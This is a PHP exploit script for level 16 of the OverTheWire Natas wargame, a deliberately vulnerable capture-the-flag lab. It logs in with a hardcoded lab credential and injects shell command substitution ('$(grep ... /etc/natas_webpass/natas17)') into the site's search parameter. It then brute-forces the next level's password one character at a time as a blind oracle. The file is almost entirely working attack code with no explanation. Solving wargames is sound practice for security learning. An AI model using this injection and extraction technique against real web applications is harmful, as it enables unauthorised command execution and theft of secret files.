<?php

$authorization = "natas16:TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V";
$url = "http://natas16.natas.labs.overthewire.org/";
$verify = "<pre>\n</pre>";

function verify($inyection)
{
    global $authorization;
    global $url;
    global $verify;

    $params = array('needle' => $inyection, 'submit' => "Search");
    $handle = curl_init("$url?" . http_build_query($params));

    curl_setopt_array(
        $handle,
        array(
            CURLOPT_RETURNTRANSFER => 1,
            CURLOPT_HTTPAUTH => CURLAUTH_BASIC,
            CURLOPT_USERPWD => $authorization,
        )
    );

    $result = curl_exec($handle);

    curl_close($handle);

    return str_contains($result, $verify);
}

function contains_inyection($substring)
{
    return "$(grep $substring /etc/natas_webpass/natas17)";
}

function startwith_inyection($start)
{
    return "$(grep ^$start /etc/natas_webpass/natas17)";
}

function equals_inyection($password)
{
    return "$(grep ^$password$ /etc/natas_webpass/natas17)";
}

$alphabet = array_merge(range('A', 'Z'), range('a', 'z'), range(0, 9));
$filtered = array();

echo "Filtering characters...\n\n";

foreach ($alphabet as $letter) {
    echo "- Checking $letter.";
    if (verify(contains_inyection($letter))) {
        echo " Contained!\n";
        $filtered[] = $letter;
    } else {
        echo "\n";
    }
}

echo "\nFiltered characters: " . join("", $filtered) . "\n";

echo "Bruteforcing password...\n\n";

$password = "";
while (!verify(equals_inyection($password))) {
    echo "Current password: $password\n";
    foreach ($filtered as $letter) {
        echo "- Checking $password$letter";
        if (verify(startwith_inyection($password . $letter))) {
            echo " - Correct!\n";
            $password .= $letter;
            break;
        } else {
            echo "\n";
        }
    }
}

echo "\nFinal password: $password\n";
